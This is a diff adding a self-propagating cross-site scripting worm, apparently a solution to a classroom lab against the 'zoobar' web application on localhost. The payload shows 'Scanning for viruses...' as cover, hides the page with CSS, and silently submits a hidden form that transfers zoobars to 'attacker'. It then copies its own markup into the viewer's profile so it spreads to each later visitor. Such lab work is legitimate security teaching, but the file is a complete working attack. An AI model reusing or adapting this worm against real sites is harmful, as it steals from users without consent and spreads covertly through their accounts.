@@ -1,0 +1,37 @@
+Scanning for viruses...
+<span id="zoobars" class="10"></span>
+<style>body>table>tbody>tr>td{display:none;}</style>
+<script>
+var status = 'Transfer';
+function load() {
+if (status == 'Done') {
+alert('Victory!');
+} else if (status == 'Transfer') {
+document.getElementsByName('transfer_submit')[0].click();
+} else if (status == 'Profile') {
+document.getElementsByName('profile_submit')[0].click();
+}
+}
+</script>
+<form method="POST" name="transferform" target="action done" action="http://localhost:8080/zoobar/index.cgi/transfer" style="display: none; visibility: hidden; height: 0; width: 0; position: absolute">
+<p>Send <input name="zoobars" type="text" value="1"> zoobars</p>
+<p>to <input name="recipient" type="text" value="attacker"></p>
+<input type="submit" name="transfer_submit" value="Send">
+</form>
+<form method="POST" name="profileform" target="action done" action="http://localhost:8080/zoobar/index.cgi" style="display: none; visibility: hidden; height: 0; width: 0; position: absolute">
+<textarea name="profile_update" rows="20" cols="80"></textarea>
+<input type="submit" name="profile_submit" value="Save" />
+</form>
+<script>
+pn = document.getElementsByName('profile_update')[0];
+var worm_str = document.getElementById('profile').innerHTML;
+var add_str = "<iframe name=\"action done\" onload=\"load()\" style=\"visibility: hidden; height: 0; width: 0; position: absolute\"></iframe>";
+worm_str = worm_str.substr(3, worm_str.length-7);
+worm_str += add_str;
+pn.value = worm_str;
+tf = document.getElementsByName('transferform')[0];
+tf.addEventListener('submit', function(){status = 'Profile'}, false)
+pf = document.getElementsByName('profileform')[0];
+pf.addEventListener('submit', function(){status = 'Done'}, false)
+</script>
+<iframe name="action done" onload="load()" style="visibility: hidden; height: 0; width: 0; position: absolute"></iframe>
